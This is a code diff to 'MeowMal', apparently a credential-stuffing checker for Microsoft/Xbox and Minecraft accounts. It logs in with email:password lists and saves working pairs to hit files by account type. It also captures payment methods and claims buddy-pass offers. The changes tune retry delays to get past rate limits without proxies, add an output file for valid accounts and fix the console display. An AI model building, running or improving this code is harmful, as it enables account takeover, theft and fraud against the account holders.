@@ -27,6 +27,7 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 warnings.filterwarnings('ignore')
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+from bs4 import BeautifulSoup
 
 colorama_init(autoreset=False, strip=False)
 file_lock = threading.Lock()
@@ -49,6 +50,18 @@ def get_optimized_timeout(config=None):
         return (3, 5)
     else:
         return config.get('timeout', 8) if config else 10
+if sys.platform == 'win32':
+    try:
+        os.system('chcp 65001 >nul 2>&1')
+        if hasattr(sys.stdout, 'reconfigure'):
+            sys.stdout.reconfigure(encoding='utf-8', errors='replace')
+            sys.stderr.reconfigure(encoding='utf-8', errors='replace')
+        else:
+            import codecs
+            sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, errors='replace')
+            sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, errors='replace')
+    except Exception:
+        pass
 class SimpleUtils:
     _title_cache = ''
     @staticmethod
@@ -56,11 +69,18 @@ class SimpleUtils:
         if title == SimpleUtils._title_cache:
             return
         SimpleUtils._title_cache = title
-        try:
-            sys.stdout.write(f'\x1b]0;{title}\x07')
-            sys.stdout.flush()
-        except Exception:
-            pass
+        if sys.platform == 'win32':
+            try:
+                import ctypes
+                ctypes.windll.kernel32.SetConsoleTitleW(title)
+            except Exception:
+                pass
+        else:
+            try:
+                sys.stdout.write(f'\x1b]0;{title}\x07')
+                sys.stdout.flush()
+            except Exception:
+                pass
 utils = SimpleUtils()
 _FORMAT_THRESHOLDS = [(1000000000.0, 'B', 2), (1000000.0, 'M', 2), (1000.0, 'K', 1)]
 def format_number(num):
@@ -326,7 +346,7 @@ class UIManager:
         self.clear_from_cursor()
         self.log_area_count = 0
     def clear_screen(self):
-        os.system('cls') if os.name == 'nt' else os.system('clear')
+        os.system('cls' if os.name == 'nt' else 'clear')
     def move_cursor_home(self):
         print('\x1b[H', end='')
     def clear_from_cursor(self):
@@ -337,7 +357,7 @@ class UIManager:
         if not getattr(self, 'log_initialized', False):
             self.clear_screen()
             _title = Fore.CYAN
-            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: O.9 | Dev: MeowMal Dev's \n"
+            ascii_logo = '   __  __                    __  __       _ \n  |  \\/  |                  |  \\/  |     | | ' + '\n  | \\  / | ___  _____      _| \\  / | __ _| | ' + '\n  | |\\/| |/ _ \\/ _ \\ \\ /\\ / / |\\/| |/ _` | | ' + '\n  | |  | |  __/ (_) \\ V  V /| |  | | (_| | | ' + '\n  |_|  |_|\\___|\\___/ \\_/\\_/ |_|  |_|\\__,_|_| ' + "\n  Version: 1.0 | Dev: MeowMal Dev's \n"
             print(Fore.CYAN + ascii_logo + Style.RESET_ALL)
             print('')
             print(f'{_title}Live Logs{Style.RESET_ALL}' + ' ' * max(0, getattr(self, 'width', 120) - len(self._strip_ansi('Live Logs'))))
@@ -1224,6 +1244,8 @@ class Capture:
                                         self.hypixl = match_brute.group(0) 
                                 except:
                                     pass
+                        if self.hypixl and ('View player,' in self.hypixl or 'not found' in self.hypixl.lower() or 'plancke' in self.hypixl.lower()):
+                            self.hypixl = 'N/A'
                 except:
                     pass
                 try:
@@ -2108,7 +2130,7 @@ def get_urlPost_sFTTag(session):
         session.proxies = getproxy()
         retries += 1
         attempts += 1
-        time.sleep(0.1)
+        time.sleep(15 if is_no_proxy() else 0.1)
     return (None, None, session)
 def get_xbox_rps(session, email, password, urlPost, sFTTag):
     global bad, checked, cpm, twofa, retries
@@ -2151,7 +2173,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
             session.proxies = getproxy()
             retries += 1
             tries += 1
-            time.sleep(0.1)
+            time.sleep(2 if is_no_proxy() else 0.1)
     return ('None', session)
 def payment(session, email, password):
     global retries, payment_methods, hits, config
@@ -2365,7 +2387,11 @@ def capture_mc(access_token, session, email, password, type):
             elif r.status_code == 429:
                 retries += 1
                 session.proxies = getproxy()
-                time.sleep(0.5 if len(proxylist) > 0 else 1)
+                time.sleep((random.uniform(5, 10)) if is_no_proxy() else (0.5 if len(proxylist) > 0 else 1))
+                if attempts >= maxretries:
+                    CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
+                    CAPTURE.handle(session)
+                    break
                 continue
             else:
                 CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
@@ -2374,7 +2400,7 @@ def capture_mc(access_token, session, email, password, type):
         except Exception:
             retries += 1
             session.proxies = getproxy()
-            time.sleep(0.1)
+            time.sleep(2 if is_no_proxy() else 0.1)
             if attempts >= maxretries:
                 try:
                     CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
@@ -2511,7 +2537,8 @@ def checkmc(session, email, password, token, xbox_token):
     global retries, cpm, checked, xgp, xgpu, other, config
     acctype = None
     attempts = 0
-    max_time = time.time() + 45
+    max_time = time.time() + 120
+    checkrq = None
     while attempts < maxretries and time.time() < max_time:
         attempts += 1
         try:
@@ -2519,22 +2546,22 @@ def checkmc(session, email, password, token, xbox_token):
             if checkrq.status_code == 429:
                 retries += 1
                 session.proxies = getproxy()
-                time.sleep(0.1 if len(proxylist) > 0 else 1)
+                time.sleep((random.uniform(10, 15)) if is_no_proxy() else (0.1 if len(proxylist) > 0 else 1))
                 continue
             else:
                 break
         except Exception as e:
             retries += 1
             if UI_ENABLED and ui:
-                ui.log_error(f'Network error: {str(e)[:30]}')
+                ui.log_error(f'Network error: {str(e)[:100]}')
             session.proxies = getproxy()
-            time.sleep(0.1)
+            time.sleep(2 if is_no_proxy() else 0.1)
             continue
     if time.time() >= max_time:
         if UI_ENABLED and ui:
-            ui.log_error(f'Timeout checking {email}')
+            ui.log_error(f'Timeout checking {email} (took >120s)')
         return False
-    if checkrq.status_code == 200:
+    if checkrq is not None and checkrq.status_code == 200:
         acctype = checkownership(checkrq.json())
         if acctype is None:
             return False
@@ -2564,6 +2591,8 @@ def checkmc(session, email, password, token, xbox_token):
             with stats_lock:
                 xgpu += 1
             write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
+            if 'Normal' in acctype:
+                write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
             claim_buddypass_offers(session, xbox_token, fname)
             capture_mc(token, session, email, password, acctype)
             return True
@@ -2579,6 +2608,10 @@ def checkmc(session, email, password, token, xbox_token):
             except:
                 pass
             return True
+        elif acctype == 'Normal Minecraft':
+            write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
+            return True
+        return True
 def mc_token(session, uhs, xsts_token):
     global retries
     attempts = 0
@@ -2588,14 +2621,14 @@ def mc_token(session, uhs, xsts_token):
             mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'}, headers={'Content-Type': 'application/json'}, timeout=15)
             if mc_login.status_code == 429:
                 session.proxies = getproxy()
-                time.sleep(0.5 if len(proxylist) > 0 else 2)
+                time.sleep((random.uniform(5, 10)) if is_no_proxy() else (0.5 if len(proxylist) > 0 else 2))
                 continue
             else:
                 return mc_login.json().get('access_token')
         except:
             retries += 1
             session.proxies = getproxy()
-            time.sleep(0.1)
+            time.sleep(2 if is_no_proxy() else 0.1)
             continue
     return None
 RE_SFTTAG_VALUE = re.compile(r'value=\\"(.+?)\\"|value="(.+?)"|sFTTag:\'(.+?)\'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"', re.S)
@@ -2615,8 +2648,8 @@ def create_optimized_session():
     pool_size = 4
     
     use_proxies = config.get('use_proxies', False)
-    backoff = 2.5 if not use_proxies else 0.5
-    retry_strategy = Retry(total=4, connect=4, read=4, backoff_factor=backoff, status_forcelist=[408, 429, 500, 502, 503, 504], allowed_methods=frozenset(['GET', 'POST']))
+    backoff = 0.5
+    retry_strategy = Retry(total=2 if not use_proxies else 4, connect=2 if not use_proxies else 4, read=2 if not use_proxies else 4, backoff_factor=backoff, status_forcelist=[408, 429, 500, 502, 503, 504], allowed_methods=frozenset(['GET', 'POST']))
     adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=retry_strategy)
     session.mount('https://', adapter)
     session.mount('http://', adapter)
@@ -2837,8 +2870,7 @@ def getproxy():
         else:
             return {}
             
-        if UI_ENABLED and ui:
-            ui.log_info(f'Using proxy: {proxy[:10]}... ({proxy_protocol})')
+
         if proxytype == "'2'":
             protocol_prefix = 'socks4'
         elif proxytype == "'3'":
@@ -2909,7 +2941,7 @@ def pre_check_combo(email, password):
     }
     
     current_try = 0
-    while current_try <= maxretries:
+    while current_try <= min(2, maxretries):
         try:
             proxy_config = None
             if proxytype != "'4'":
@@ -2922,7 +2954,7 @@ def pre_check_combo(email, password):
             
             if status_code >= 500 or status_code == 429:
                 current_try += 1
-                time.sleep(1.5)
+                time.sleep(random.uniform(20.0, 30.0) if is_no_proxy() else 1.5)
                 continue
                 
             two_fa_indicators = ['suggestedaction', 'sign in to continue', 'enter code', 'two-step', 'two. step', 'two factor', '2fa', 'second verification', 'verification code', 'authenticator', 'texted you', 'sent a code', 'enter the code', 'additional security', 'extra security']
@@ -3038,17 +3070,18 @@ def logscreen():
     global cpm, cpm1, screen, hits, bad, twofa, mfa, sfa, xgp, xgpu, vm, other, checked, retries, errors
     total_combos = len(Combos)
     while checked < total_combos:
-        cpm1 = cpm
-        cpm = 0
-        if checked > 0 and cpm1 == 0:
-            cpm1 = checked
+        cpm_val = 0
+        if UI_ENABLED and getattr(ui, 'start_time', None):
+            elapsed = time.time() - ui.start_time
+            if elapsed > 0:
+                cpm_val = int(checked / elapsed * 60)
         try:
-            title_stats = f"MeowMal by MeowMal Dev's | Checked: {checked}/{total_combos} - Hits: {hits} - Bad: {bad} - 2FA: {twofa} - SFA: {sfa} - MFA: {mfa} - XGP: {xgp} - XGPU: {xgpu} - Valid Mail: {vm} - Other: {other} - CPM: {cpm1 * 60} - Retries: {retries} - Errors: {errors}"
+            title_stats = f"MeowMal by MeowMal Dev's | Checked: {checked}/{total_combos} - Hits: {hits} - Bad: {bad} - 2FA: {twofa} - SFA: {sfa} - MFA: {mfa} - XGP: {xgp} - XGPU: {xgpu} - Valid Mail: {vm} - Other: {other} - CPM: {cpm_val} - Retries: {retries} - Errors: {errors}"
             utils.set_title(title_stats)
         except:
             pass
         if UI_ENABLED and ui:
-            ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm1 * 60, retries=retries, errors=errors)
+            ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=total_combos, cpm=cpm_val, retries=retries, errors=errors)
             ui.show_ui_screen()
         time.sleep(1)
 
@@ -3204,7 +3237,7 @@ def loadconfig():
 def Main():
     global fname, screen, config, proxytype, banproxies, errors, cpm1, hits, bad, twofa, vm, xgp, xgpu, other, mfa, sfa, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, checked, retries
     utils.set_title("MeowMal by MeowMal Dev's")
-    os.system('cls') if os.name == 'nt' else os.system('clear')
+    os.system('cls' if os.name == 'nt' else 'clear')
     try:
         if loadconfig():
             print(f'{Fore.GREEN}✓ Configuration loaded successfully{Fore.RESET}')
